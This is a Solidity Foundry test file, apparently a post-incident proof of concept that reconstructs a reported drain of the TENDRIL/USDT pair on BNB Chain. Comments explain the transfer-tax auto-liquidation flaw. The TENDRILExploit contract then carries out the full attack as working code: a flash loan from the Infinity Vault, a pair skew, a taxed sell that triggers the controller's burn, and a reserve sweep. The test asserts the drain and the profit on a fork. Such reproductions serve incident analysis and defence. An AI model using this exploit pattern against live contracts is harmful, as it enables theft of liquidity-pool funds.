// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// TENDRIL transfer-tax auto-liquidation drain (BNB Chain, 2026-11-04)
//
// @Incident
// TENDRIL's sell path auto-sells the pool controller's own TENDRIL into the TENDRIL/USDT pair on
// every taxed transfer. An attacker skewed that pair with a flash-borrowed USDT buy, then a single
// taxed sell made the controller dump and burn the pair down to dust, letting the attacker sweep
// the pair's whole USDT reserve. Reported ~$555K drained from the pair / ~$541K payout (estimate).
//   Chain             : BNB Chain
//   Exploit tx        : https://bscscan.com/tx/0xfdff4fba4327821c204af07944076ecaaee163a994398fdf4063d08712e40059
//   Attacker EOA      : https://bscscan.com/address/0xb81e4aafa347b27112b7f6f5de6cf7cd516021ff
//   Attacker contract : https://bscscan.com/address/0xc8cb6a2aa825a576e1470479046056fe414ee0f8
//   TENDRIL token     : https://bscscan.com/address/0xb1afdfd850da168f2cc9f742e11cdda5273973d2 (verified)
//   TENDRIL/USDT pair : https://bscscan.com/address/0x5de082471f2a9f01a61e467a32837dee830d99e0
//   Pool controller   : https://bscscan.com/address/0xd00be871eb7a5cb8a69aea41e4c95affc92e54fe (_poolControl, unverified)
//   Infinity Vault    : https://bscscan.com/address/0x238a358808379702088667322f80ac48bad5e6c4 (flash loan source)
//
// @Root cause
// TENDRIL._transfer taxes any non-privileged sell into the pair 30% and, as a side effect, calls
// the controller's sellToken() on every such transfer (verified source, TENDRIL.sol):
//   } else if (to == _uniswapV2Pair) {
//       if (from != _poolControl && from != _markControl) { tax = 30; }
//   }
//   ...
//   if (tax > 0) {
//       uint256 taxAmount = (amount * tax) / 100;
//       _basicTransfer(from, _poolControl, taxAmount);
//       IPancakeFactory(_poolControl).sellToken(amount);   // auto-liquidation, attacker-triggered
//       amount -= taxAmount;
//   }
// sellToken() dumps the controller's accumulated TENDRIL into the pair for USDT and then
// controlburn()s the pair's TENDRIL reserve by ~2x the sell amount. There is no price or reserve
// guard: it trusts the pair's live spot price. The flash loan, the swaps and the tax-triggered
// sellToken path are all reachable by a fresh EOA/contract with no role, and the auto-liquidation
// fires purely as a side effect of the attacker's own taxed swap.
//
// @Reconstruction
// Fork block 131653426 (one block before the exploit tx). A fresh attacker contract drives the real
// verified contracts with typed interface calls, no vm.mock / vm.store / vm.prank of any protocol:
//   1. Flash-take 30,641,402 USDT from the PancakeSwap Infinity Vault (real take/settle lock, repaid
//      in the same lock, no deal() for the borrowed USDT).
//   2. Buy TENDRIL working capital through the unrestricted USDT->FLAP->TENDRIL route (the TENDRIL/USDT
//      pair blocks direct buys, so the attacker uses a sibling pool).
//   3. Skew the TENDRIL/USDT pair with a 4,097,517 USDT buy. The token forces the pair's TENDRIL
//      output to the controller, loading it and pumping the pair's USDT reserve to ~4.65M.
//   4. Sell the TENDRIL back in one swap. The 30% tax auto-calls sellToken(), which dumps the
//      controller's TENDRIL and controlburns the pair's reserve to dust; the untaxed 70% then swaps
//      against a near-zero TENDRIL reserve and takes out essentially the entire USDT reserve.
//   5. Repay the flash loan inside the lock and sweep the surplus.
//
// Pre-positioned capital, provenance resolved on-chain: entering the exploit tx the attacker contract
// 0xc8cb6a already held 33,062,475,439 TENDRIL. It acquired that permissionlessly, not from any
// privileged source: funding address 0xb87cf5 bought it across 57 ordinary USDT swaps from the
// UNRESTRICTED secondary USDT/TENDRIL pool 0xda0bc72c over ~11 days (net ~7.4K USDT, TENDRIL priced
// near zero there), then moved it to 0xc8cb6a in setup tx 0x465d8ef4 ~147 blocks before the exploit.
// No mint, no deployer allocation, no _poolControl gift, no whitelist. That secondary pool is drained
// to ~1.12M TENDRIL at this block, so the amount cannot be re-bought atomically on the fork; the PoC
// forks after the accumulation and relocates the real, already-held on-chain balance into the fresh
// exploit contract (not deal()-minted). It is ordinary attacker working capital, not the exploited
// value and not the flash-borrowed USDT; everything else is reconstructed live with typed calls. The
// sell must clear ~33B for controlburn (2x the sell) to wipe the skewed ~66B reserve.
//
// @Result
// Pair USDT reserve drained from 555,670 to ~0. Attacker net profit 308,959.367543173232679069 USDT,
// matching the on-chain profit sweep to the wei. The ~$555K headline is the full pair reserve drained;
// the attacker's net is lower because the controller routed part of it to its own fee recipients.
//
// @Run
// forge test --contracts src/test/2026-11/TENDRIL_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

// PancakeSwap Infinity Vault (singleton custodying funds, transient per-locker deltas).
interface IInfinityVault {
    function lock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function settle() external payable returns (uint256 paid);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TENDRILExploit {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant TENDRIL = IERC20(0xb1afDfD850DA168F2Cc9f742e11cdDa5273973d2);
    address constant FLAP = 0x221f7336711cd6eB72d8C897a0d185A12a357777; // sibling token for the unrestricted buy route
    IInfinityVault constant VAULT = IInfinityVault(0x238a358808379702088667322f80aC48bAd5e6c4);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant POOL_CONTROL = 0xd00be871EB7A5Cb8a69aea41E4c95AFFc92e54Fe;

    // Exact amounts observed in the attack trace at the parent block.
    uint256 constant FLASH = 30641402469693374619537651; // 30,641,402 USDT flash loan
    uint256 constant AMMO_USDT = 14546348936756980821733; // USDT spent buying TENDRIL ammo
    uint256 constant SKEW_USDT = 4097517640989353206085697; // USDT spent skewing the pair

    function attack() external {
        VAULT.lock("");
    }

    // PancakeSwap Infinity Vault lock callback (the attack body).
    function lockAcquired(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(VAULT), "not vault");

        // Flash-take 30.64M USDT from the Vault; settled at the end of this lock.
        VAULT.take(address(USDT), address(this), FLASH);

        USDT.approve(address(ROUTER), type(uint256).max);
        TENDRIL.approve(address(ROUTER), type(uint256).max);

        // 1. Buy TENDRIL ammo via the unrestricted USDT -> FLAP -> TENDRIL route.
        address[] memory p1 = new address[](3);
        p1[0] = address(USDT);
        p1[1] = FLAP;
        p1[2] = address(TENDRIL);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(AMMO_USDT, 0, p1, address(this), block.timestamp);

        // 2. Skew the USDT/TENDRIL pair: the token routes the bought TENDRIL to _poolControl and the
        //    pair's USDT reserve is pumped.
        address[] memory p2 = new address[](2);
        p2[0] = address(USDT);
        p2[1] = address(TENDRIL);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(SKEW_USDT, 0, p2, POOL_CONTROL, block.timestamp);

        // 3. Sell all TENDRIL back into the pair. The 30% tax auto-calls _poolControl.sellToken(),
        //    which dumps the controller's TENDRIL and controlburns the pair reserve to dust; the
        //    untaxed 70% then swaps against ~0 TENDRIL and extracts nearly the entire USDT reserve.
        address[] memory p3 = new address[](2);
        p3[0] = address(TENDRIL);
        p3[1] = address(USDT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TENDRIL.balanceOf(address(this)), 0, p3, address(this), block.timestamp
        );

        // Repay the flash loan inside the same lock.
        VAULT.sync(address(USDT));
        USDT.transfer(address(VAULT), FLASH);
        VAULT.settle();

        return "";
    }
}

contract TENDRIL_exp is Test {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant TENDRIL = IERC20(0xb1afDfD850DA168F2Cc9f742e11cdDa5273973d2);
    address constant PAIR = 0x5de082471f2A9f01a61E467A32837DeE830D99E0;

    // ~33.06B TENDRIL the attacker contract already held entering the exploit tx (see @Reconstruction).
    uint256 constant PREHELD_TENDRIL = 33062475439772047220175412838;
    // Real on-chain holder of that balance at the fork block (the attacker contract), which bought it
    // permissionlessly from the unrestricted secondary pool. We relocate, not mint.
    address constant AMMO_HOLDER = 0xc8Cb6A2aA825a576e1470479046056fe414eE0f8;

    function setUp() public {
        vm.createSelectFork("bsc", 131653426);
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        emit log_named_decimal_uint("pair USDT reserve before", USDT.balanceOf(PAIR), 18);

        TENDRILExploit exploit = new TENDRILExploit();
        assertEq(USDT.balanceOf(address(exploit)), 0, "attacker starts with 0 USDT");

        // Relocate the attacker's real, already-held, market-bought TENDRIL working capital into the
        // fresh exploit contract. Not deal()-minted: these are real on-chain tokens the attacker
        // accumulated permissionlessly (57 USDT swaps from the unrestricted secondary pool, ~7.4K USDT
        // net). The secondary pool is depleted at this block so it cannot be re-bought atomically here.
        vm.prank(AMMO_HOLDER);
        TENDRIL.transfer(address(exploit), PREHELD_TENDRIL);

        exploit.attack();

        uint256 profit = USDT.balanceOf(address(exploit));
        emit log_named_decimal_uint("pair USDT reserve after ", USDT.balanceOf(PAIR), 18);
        emit log_named_decimal_uint("attacker USDT profit    ", profit, 18);

        // Pair's entire USDT reserve drained (headline ~555K "drained from the pair").
        assertLt(USDT.balanceOf(PAIR), 1e18, "pair USDT reserve not drained");
        // Attacker net profit swept on-chain was 308,959.367... USDT (headline ~$541K payout is an
        // estimate; the rest of the drained reserve went to the controller's own fee distributions).
        assertApproxEqRel(profit, 308959367543173232679069, 0.001e18, "profit off measured ~308.96K USDT");
    }
}
